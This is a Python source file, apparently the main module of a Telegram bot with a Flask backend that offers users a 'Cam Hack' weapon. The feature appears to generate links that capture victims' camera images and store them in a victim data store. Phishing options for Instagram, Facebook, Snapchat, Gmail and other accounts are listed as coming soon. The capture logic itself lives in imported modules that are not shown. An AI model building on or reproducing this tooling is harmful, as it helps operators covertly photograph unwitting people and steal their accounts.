import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import time
import threading
from flask import Flask
from bot.config import BOT_TOKEN
from bot.buttons.cam import handle_cam_hack
from bot.server import app as flask_app
from bot.utils.storage import link_cache, victim_data_store

# ========== BOT ==========
bot = telebot.TeleBot(BOT_TOKEN)

# ========== BOTTOM BUTTONS ==========
def get_bottom_buttons():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton("📸 Cam Hack"),
        KeyboardButton("📸 Instagram"),
        KeyboardButton("📘 Facebook"),
        KeyboardButton("🐦 Twitter"),
        KeyboardButton("👻 Snapchat"),
        KeyboardButton("📧 Gmail"),
        KeyboardButton("🎮 Free Fire"),
        KeyboardButton("🔗 All Links")
    )
    return markup

# ========== /START ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id
    bot.send_message(
        user_id,
        "🔥 *Choose your weapon:*\n\n"
        "📸 Cam Hack (working)\n"
        "📸 Instagram (coming soon)\n"
        "📘 Facebook (coming soon)\n"
        "🐦 Twitter (coming soon)\n"
        "👻 Snapchat (coming soon)\n"
        "📧 Gmail (coming soon)\n"
        "🎮 Free Fire (coming soon)\n"
        "🔗 All Links (coming soon)",
        reply_markup=get_bottom_buttons(),
        parse_mode="Markdown"
    )

# ========== ROUTING ==========
@bot.message_handler(func=lambda message: True)
def route_buttons(message):
    text = message.text
    user_id = message.chat.id

    if text == "📸 Cam Hack":
        handle_cam_hack(bot, message, get_bottom_buttons)

    elif text in ["📸 Instagram", "📘 Facebook", "🐦 Twitter", "👻 Snapchat", "📧 Gmail", "🎮 Free Fire", "🔗 All Links"]:
        bot.send_message(
            user_id,
            f"⏳ *{text}* is coming soon. Only *Cam Hack* is working right now.",
            reply_markup=get_bottom_buttons(),
            parse_mode="Markdown"
        )

    else:
        bot.send_message(user_id, "❌ Use buttons below.", reply_markup=get_bottom_buttons())

# ========== INLINE CALLBACKS ==========
@bot.callback_query_handler(func=lambda call: True)
def handle_inline(call):
    if call.data == "copy":
        bot.answer_callback_query(call.id, "✅ Select and copy the link manually!")

# ========== RUN BOT ==========
def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)

# ========== FLASK APP ==========
app = flask_app

if __name__ == "__main__":
    print("🤖 Cam Hack is working...")
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False)
